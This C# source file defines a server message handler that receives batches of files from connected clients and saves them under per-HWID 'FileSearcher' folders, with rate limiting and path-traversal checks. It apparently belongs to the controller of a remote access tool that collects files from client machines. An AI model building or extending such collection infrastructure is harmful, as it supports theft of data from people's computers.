using System;
using System.Collections.Concurrent;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerFileSearcher
{
	private static readonly ConcurrentDictionary<string, DateTime> _lastRequest = new ConcurrentDictionary<string, DateTime>();

	private static readonly ConcurrentDictionary<string, int> _requestCount = new ConcurrentDictionary<string, int>();

	private const int MaxRequestsPerMinute = 5;

	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 3)
		{
			return;
		}
		string clientKey = client.IP + ":" + (client.Hwid ?? "unknown");
		DateTime now = DateTime.UtcNow;
		if (_lastRequest.TryGetValue(clientKey, out var lastReq) && (now - lastReq).TotalMinutes < 1.0)
		{
			if (_requestCount.AddOrUpdate(clientKey, 1, (string k, int v) => v + 1) > 5)
			{
				return;
			}
		}
		else
		{
			_lastRequest[clientKey] = now;
			_requestCount[clientKey] = 1;
		}
		string text = SecurityHelper.SanitizeHwid(objects[1]?.ToString() ?? "Unknown");
		string baseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users", text, "FileSearcher");
		if (!SecurityHelper.IsSafePath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users"), text))
		{
			client.Disconnect();
			return;
		}
		object[] array = (object[])objects[2];
		int maxFiles = Math.Min(array.Length, 100);
		for (int i = 0; i < maxFiles; i++)
		{
			object[] array2 = (object[])array[i];
			if (array2 == null || array2.Length < 2)
			{
				continue;
			}
			string text2 = (string)array2[0];
			if (string.IsNullOrEmpty(text2) || text2.Contains("..") || Path.IsPathRooted(text2))
			{
				client.Disconnect();
				return;
			}
			string fullPath2 = Path.GetFullPath(Path.Combine(baseDir, text2));
			if (!fullPath2.StartsWith(baseDir, StringComparison.OrdinalIgnoreCase))
			{
				client.Disconnect();
				return;
			}
			try
			{
				string dirName = Path.GetDirectoryName(fullPath2);
				if (!string.IsNullOrEmpty(dirName))
				{
					Directory.CreateDirectory(dirName);
				}
				File.WriteAllBytes(fullPath2, (byte[])array2[1]);
			}
			catch
			{
			}
		}
		Methods.AppendLogs(client.IP, "Save Files in: Users\\" + text + "\\FileSearcher", Color.MediumPurple);
	}
}
